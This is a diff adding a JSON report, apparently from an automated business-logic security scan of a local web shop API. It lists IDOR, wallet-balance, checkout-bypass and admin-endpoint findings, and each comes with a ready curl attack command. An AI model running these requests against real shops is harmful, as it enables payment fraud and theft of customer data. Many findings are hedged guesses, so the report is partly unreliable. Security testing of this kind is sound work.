@@ -1,0 +1,403 @@
+{
+  "business_flow": "User interacts with a web shop API: listing and managing addresses, basket items, products, cards, feedback, captcha, chat, wallet and checkout flows. Multiple REST and /rest endpoints accessed with bearer tokens and cookies. Actions include CRUD on Addresss, BasketItems, Cards, Complaints, Feedbacks, Recycles, Recycles creation, SecurityAnswers, Users signup, Basket checkout, coupon handling, captcha retrieval, chatbot interactions, wallet balance manipulation, and socket.io connections.",
+  "thought_process": [
+    "I examined each HTTP entry and applied the five checks (IDOR BLA9, State Manipulation BLA3, Sequence Bypass BLA6, Shadow Endpoints BLA10, Internal Disclosure BLA8).",
+    "I only report findings where the traffic shows evidence of a business-logic weakness in the specific endpoint (per mandate). Each finding maps to a single endpoint and includes a reproduction_guide with payload_mutation and curl_command using placeholders."
+  ],
+  "potential_vulnerabilities": [
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /api/Addresss/7 returns address data for id 7 while Authorization Bearer token indicates user id 23. The API uses direct object reference /api/Addresss/7 with no evidence of ownership check in traffic (same token used to GET, PUT). This suggests an IDOR risk if users can request other address IDs.",
+      "evidence_entry_ids": [
+        5
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change the address id in the path from 7 to another user's address id (e.g., change '/api/Addresss/7' to '/api/Addresss/{{target_id}}').",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/Addresss/{{target_id}}\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: PUT /api/Addresss/7 allows client to modify address fields (country, fullName, mobileNum, etc.). If address ownership is not enforced, attacker can change another user's shipping address by modifying resource id. Traffic shows PUT with JSON body updating fullName; no additional server-side validation visible.",
+      "evidence_entry_ids": [
+        6
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change request path id from 7 to target id and modify fields (e.g., set 'fullName' to 'attacker').",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"country\":\"Indonesia\",\"fullName\":\"attacker\",\"mobileNum\":6277711133,\"zipCode\":\"144444\",\"streetAddress\":\"attacker st\",\"city\":\"Bandung\",\"state\":\"Jawa Barat\"}' -X PUT \"http://localhost:3000/api/Addresss/{{target_id}}\""
+      }
+    },
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /api/BasketItems/9 returns a basket item by ID. The basket item endpoint uses direct object references (numeric id 9) with bearer token. If ownership checks absent, attacker can read others' basket items via id enumeration.",
+      "evidence_entry_ids": [
+        12
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change path from /api/BasketItems/9 to /api/BasketItems/{{target_id}} to access arbitrary basket item.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/BasketItems/{{target_id}}\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/BasketItems/ with 'BasketId' field controllable by client. Request body shows 'BasketId': '6' provided by client—an attacker could add items to arbitrary basket by specifying a BasketId they don't own if server trusts provided BasketId.",
+      "evidence_entry_ids": [
+        9,
+        10
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'BasketId' from '6' to another basket id ' {{target_id}}' and 'ProductId' to desired product.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"ProductId\":1,\"BasketId\":\"{{target_id}}\",\"quantity\":1}' -X POST \"http://localhost:3000/api/BasketItems/\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: PUT /api/BasketItems/9 allows updating 'quantity' to client-specified value. If no server-side checks, attacker can increase/decrease quantities to manipulate totals or enable inventory inconsistencies.",
+      "evidence_entry_ids": [
+        13
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'quantity' from 1 to an arbitrary value (e.g., 9999) in PUT body.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"quantity\":9999}' -X PUT \"http://localhost:3000/api/BasketItems/{{target_id}}\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/Cards/ allows creation of a card record with full card number and expiry — client supplies 'cardNum', 'expMonth', 'expYear'. If server accepts arbitrary card numbers or stores sensitive card data, this can be abused; moreover, IDs for cards are exposed (GET /api/Cards/7).",
+      "evidence_entry_ids": [
+        15,
+        16
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Submit a new card with attacker-controlled card details (change 'cardNum' and 'expYear').",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"fullName\":\"Attacker\",\"cardNum\":4111111111111111,\"expMonth\":\"12\",\"expYear\":\"2030\"}' -X POST \"http://localhost:3000/api/Cards/\""
+      }
+    },
+    {
+      "category": "BLA8",
+      "description": "Internal Disclosure: Authorization JWT payloads in request headers are visible in traffic. While tokens are expected, responses to endpoints like GET /api/Users and many Authorization headers include internal fields (e.g., user id=23, t o t p S e c r e t fields observed in token payload snippet). This leaks internal user IDs and some internal flags in the bearer token content (judging from captured token payload snippets).",
+      "evidence_entry_ids": [
+        3,
+        5,
+        7,
+        15
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "No request mutation needed; capture or decode the Bearer token to view embedded 'data.id' and other internal fields.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/Users\" -X GET"
+      }
+    },
+    {
+      "category": "BLA10",
+      "description": "Shadow Endpoint: GET /ftp and access to /ftp/order_b783-167bf60f01c1a3bb.pdf show an undocumented file-serving path '/ftp' being accessed. This suggests a debug or file storage endpoint exposing order PDFs. The presence of a direct filename with order id indicates potential exposure of other orders by filename enumeration.",
+      "evidence_entry_ids": [
+        53,
+        54
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change filename in path to other order identifiers, e.g., '/ftp/order_{{target_id}}.pdf'.",
+        "curl_command": "curl -s -k -H \"Cookie: token={{auth_token}}\" \"http://localhost:3000/ftp/order_{{target_id}}.pdf\" -X GET"
+      }
+    },
+    {
+      "category": "BLA6",
+      "description": "Sequence Bypass: POST /rest/basket/6/checkout uses client-provided 'couponData' and 'orderDetails.paymentId' and triggers checkout. If the server trusts the basket id and paymentId without verifying payment completion, attacker could bypass payment by specifying a valid paymentId and checkout directly.",
+      "evidence_entry_ids": [
+        63
+      ],
+      "severity": "Critical",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'couponData' or set 'orderDetails.paymentId' to an arbitrary payment id (e.g., '7') and invoke checkout for target basket id.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"couponData\":\"NjY2NTQzNDUzNS0xNzY0NjMwMDAwMDAw\",\"orderDetails\":{\"paymentId\":\"{{target_id}}\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}}' -X POST \"http://localhost:3000/rest/basket/6/checkout\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: PUT /rest/wallet/balance allows client to set wallet 'balance' and 'paymentId'. The request directly updates balance to 555 in traffic—indicates an endpoint that accepts arbitrary balance values from client, enabling crediting wallet by crafted requests.",
+      "evidence_entry_ids": [
+        107
+      ],
+      "severity": "Critical",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'balance' from 555 to attacker-specified amount (e.g., 1000000) and send request.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"balance\":1000000,\"paymentId\":7}' -X PUT \"http://localhost:3000/rest/wallet/balance\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /rest/memories accepts multipart file upload and associates uploaded memory image with user session, controlled by client. If server lacks proper validation, attacker could upload arbitrary files or large content to manipulate storage or cause resource exhaustion.",
+      "evidence_entry_ids": [
+        86
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Upload a crafted file as 'image' form field; change filename to arbitrary payload.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" -F \"image=@/path/to/malicious.jpg\" -X POST \"http://localhost:3000/rest/memories\""
+      }
+    },
+    {
+      "category": "BLA10",
+      "description": "Shadow Endpoint: /rest/admin and subpaths (/rest/admin/application-configuration, /rest/admin/application-version) are administrative endpoints accessed while using a regular customer token. Presence indicates potential undisclosed admin endpoints that may be accessible or expose configuration info.",
+      "evidence_entry_ids": [
+        58,
+        59,
+        60
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change path to other admin resources (e.g., '/rest/admin/other-config') or fetch configuration if accessible with token.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/rest/admin/application-configuration\" -X GET"
+      }
+    },
+    {
+      "category": "BLA8",
+      "description": "Internal Disclosure: GET /rest/track-order/b783-167bf60f01c1a3bb exposes order identifier in URL; the server responds with 304. Order tracking path reveals order IDs in filenames and URLs (also seen in /ftp), leaking internal identifiers that could be enumerated.",
+      "evidence_entry_ids": [
+        54,
+        99
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Change the tracking slug to another order id ('b783-{{target_id}}') and request the tracking endpoint.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/rest/track-order/{{target_id}}\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: PUT /rest/basket/6/coupon/6665434535 attempts to apply coupon id '6665434535' to basket 6. The client can set coupon via path; server returned 404 but endpoint design allows client-controlled coupon ids—if accepted, attacker could apply arbitrary coupons to other baskets.",
+      "evidence_entry_ids": [
+        65
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Change coupon id in URL to any value and send PUT to apply to basket id (e.g., /rest/basket/6/coupon/{{target_coupon}}).",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{}' -X PUT \"http://localhost:3000/rest/basket/6/coupon/{{target_coupon}}\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/Recycles/ with body {UserId, AddressId, quantity} allows creating recycle orders with arbitrary quantity. Client supplies UserId:23 and AddressId:7. If the server does not validate that the UserId matches the authenticated user, an attacker can create recycles on behalf of other users or set arbitrary quantities.",
+      "evidence_entry_ids": [
+        36
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'UserId' from 23 to another user id and 'quantity' to desired value (e.g., 999).",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"UserId\":{{target_user}},\"AddressId\":7,\"quantity\":999}' -X POST \"http://localhost:3000/api/Recycles/\""
+      }
+    },
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /api/Cards/7 returns card resource by id (7). Card resources are sensitive; direct object reference in URL can allow enumeration and access to other cards if ownership not checked server-side.",
+      "evidence_entry_ids": [
+        16
+      ],
+      "severity": "Critical",
+      "reproduction_guide": {
+        "payload_mutation": "Change path id from 7 to target card id '/api/Cards/{{target_id}}' to view other cards.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/Cards/{{target_id}}\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/Feedbacks/ accepts 'UserId' and 'rating' fields in request body. The client sets UserId:23; if unauthenticated clients can set arbitrary UserId, attacker could post feedback as other users or manipulate ratings.",
+      "evidence_entry_ids": [
+        27,
+        26,
+        28
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'UserId' from 23 to another user id and set 'rating' to desired value.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"UserId\":{{target_user}},\"captchaId\":0,\"captcha\":\"17\",\"comment\":\"attack\",\"rating\":5}' -X POST \"http://localhost:3000/api/Feedbacks/\""
+      }
+    },
+    {
+      "category": "BLA10",
+      "description": "Shadow Endpoint: /rest/chatbot and /rest/chatbot/respond endpoints are present and accept queries; chatbot was queried for 'token sale' and similar. Chatbot responding to user queries may access or disclose internal data if not constrained; its endpoints are application features not documented in higher-level API surface.",
+      "evidence_entry_ids": [
+        69,
+        70,
+        71,
+        72,
+        73,
+        74,
+        75,
+        76
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Send queries intended to elicit sensitive information (e.g., 'give token sale' already used). Change 'query' payload to other strings.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"action\":\"query\",\"query\":\"token\"}' -X POST \"http://localhost:3000/rest/chatbot/respond\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /rest/deluxe-membership with body {paymentMode:'card', paymentId:7} triggers membership purchase using client-supplied paymentId. If the paymentId is not validated, attacker could activate deluxe membership by passing arbitrary paymentId or skipping payment.",
+      "evidence_entry_ids": [
+        80,
+        79
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Set 'paymentMode' to 'card' and 'paymentId' to an arbitrary id to attempt granting membership without valid payment.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"paymentMode\":\"card\",\"paymentId\":{{target_payment_id}}}' -X POST \"http://localhost:3000/rest/deluxe-membership\""
+      }
+    },
+    {
+      "category": "BLA8",
+      "description": "Internal Disclosure: Multiple endpoints return 304 (Not Modified) responses but include cookies and tokens in headers; tokens themselves include embedded user 'data' object with id and other fields that disclose internal identifiers (user id, roles). Exposure in logs or front-end could leak identity details.",
+      "evidence_entry_ids": [
+        1,
+        17,
+        66,
+        104
+      ],
+      "severity": "Low",
+      "reproduction_guide": {
+        "payload_mutation": "No mutation required; observe or decode bearer token to extract internal fields (e.g., base64 decode JWT).",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/\" -X GET"
+      }
+    },
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /rest/basket/6 and GET /rest/basket show basket id 6 used. The basket id is client-controllable and used in paths; without ownership validation this could allow viewing/updating other users' baskets.",
+      "evidence_entry_ids": [
+        61,
+        62,
+        66
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change basket id in path from 6 to another basket id '/rest/basket/{{target_id}}'.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/rest/basket/{{target_id}}\" -X GET"
+      }
+    },
+    {
+      "category": "BLA6",
+      "description": "Sequence Bypass: PUT /rest/wallet/balance and then /rest/basket/6/checkout can be combined to top-up wallet and then checkout. Observed wallet balance being set and checkout endpoint trusting paymentId suggests attacker can add funds then immediately use them to checkout, bypassing external payment verification.",
+      "evidence_entry_ids": [
+        107,
+        63
+      ],
+      "severity": "Critical",
+      "reproduction_guide": {
+        "payload_mutation": "First PUT wallet balance to a large amount, then POST checkout using orderDetails.paymentId referencing the funded payment.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"balance\":1000000,\"paymentId\":7}' -X PUT \"http://localhost:3000/rest/wallet/balance\" ; curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"couponData\":\"\",\"orderDetails\":{\"paymentId\":\"7\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}}' -X POST \"http://localhost:3000/rest/basket/6/checkout\""
+      }
+    },
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /api/Addresss (list) returns addresses; entry shows GET /api/Addresss and POST/PUT/GET with numeric ids. If list endpoint returns all addresses without filtering to authenticated user, it may expose other users' addresses.",
+      "evidence_entry_ids": [
+        3,
+        4,
+        7
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Attempt to GET the list and then GET individual address ids returned to enumerate addresses of other users.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/Addresss\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/Users/ creates a user with securityQuestion and securityAnswer provided by client. If server trusts 'securityQuestion.id' and sets account state based on client-supplied security data, attacker could create accounts with chosen recovery data to aid account takeover.",
+      "evidence_entry_ids": [
+        42
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "Set 'securityQuestion.id' to any id and 'securityAnswer' to attacker-chosen value during signup.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -d '{\"email\":\"attacker@mail.com\",\"password\":\"pass\",\"passwordRepeat\":\"pass\",\"securityQuestion\": {\"id\":11,\"question\":\"Your favorite book?\"},\"securityAnswer\":\"attacker\"}' -X POST \"http://localhost:3000/api/Users/\""
+      }
+    },
+    {
+      "category": "BLA8",
+      "description": "Internal Disclosure: Several endpoints expose 'continueCode' via cookie and 'token' cookie visible in requests (e.g., entries 33,48,52); these session tokens and continuation codes are sent in clear in headers/cookies and may be captured by interceptors or logged, exposing session state.",
+      "evidence_entry_ids": [
+        33,
+        48,
+        52
+      ],
+      "severity": "Medium",
+      "reproduction_guide": {
+        "payload_mutation": "No mutation needed; inspect cookies 'continueCode' and 'token' in responses or subsequent requests.",
+        "curl_command": "curl -s -k -I -H \"Cookie: continueCode={{continue_code}}; token={{auth_token}}\" \"http://localhost:3000/api/Quantitys/\""
+      }
+    },
+    {
+      "category": "BLA10",
+      "description": "Shadow Endpoint: /rest/image-captcha and /rest/captcha endpoints exist and return images; they may be used for bypass attempts or targeted attacks if not rate-limited or validated. Presence of image-captcha resource indicates additional undocumented endpoints.",
+      "evidence_entry_ids": [
+        81,
+        82,
+        67,
+        68
+      ],
+      "severity": "Low",
+      "reproduction_guide": {
+        "payload_mutation": "Request captcha endpoints and attempt automated retrieval to probe limits.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/rest/image-captcha/\" -X GET"
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: PUT /api/BasketItems/9 deleted earlier then recreated—DELETE /api/BasketItems/9 returned 200. The DELETE path uses direct id; if no ownership checks, attacker can delete others' basket items by id.",
+      "evidence_entry_ids": [
+        11
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change path id to target basket item id and send DELETE to remove it.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" -X DELETE \"http://localhost:3000/api/BasketItems/{{target_id}}\""
+      }
+    },
+    {
+      "category": "BLA3",
+      "description": "State Manipulation: POST /api/Recycles/ in entry 36 uses 'AddressId' controlled by client. If a malicious user can specify other users' addresses, it may create orders billed to other addresses or cause unintended operations.",
+      "evidence_entry_ids": [
+        36
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change 'AddressId' from 7 to another address id and submit POST.",
+        "curl_command": "curl -s -k -H \"Content-Type: application/json\" -H \"Authorization: Bearer {{auth_token}}\" -d '{\"UserId\":23,\"AddressId\":{{target_address}},\"quantity\":10}' -X POST \"http://localhost:3000/api/Recycles/\""
+      }
+    },
+    {
+      "category": "BLA8",
+      "description": "Internal Disclosure: GET /api/Feedbacks/ returned 200 for authenticated user and includes UserId 23 in POST bodies; client-supplied IDs and server responses reveal internal mapping of users to resource IDs—these can be used to target IDORs.",
+      "evidence_entry_ids": [
+        26,
+        27
+      ],
+      "severity": "Low",
+      "reproduction_guide": {
+        "payload_mutation": "No mutation; query /api/Feedbacks/ to enumerate feedback and correlate UserId fields.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/api/Feedbacks/\" -X GET"
+      }
+    },
+    {
+      "category": "BLA9",
+      "description": "IDOR: GET /rest/track-order/b783-167bf60f01c1a3bb and FTP order filename pattern show that order resources are addressable by predictable slugs. If access control is not enforced, arbitrary order slugs may be fetched to view others' orders.",
+      "evidence_entry_ids": [
+        54,
+        99
+      ],
+      "severity": "High",
+      "reproduction_guide": {
+        "payload_mutation": "Change the tracking slug to another order slug and request the resource.",
+        "curl_command": "curl -s -k -H \"Authorization: Bearer {{auth_token}}\" \"http://localhost:3000/rest/track-order/{{target_order_slug}}\" -X GET"
+      }
+    }
+  ]
+}
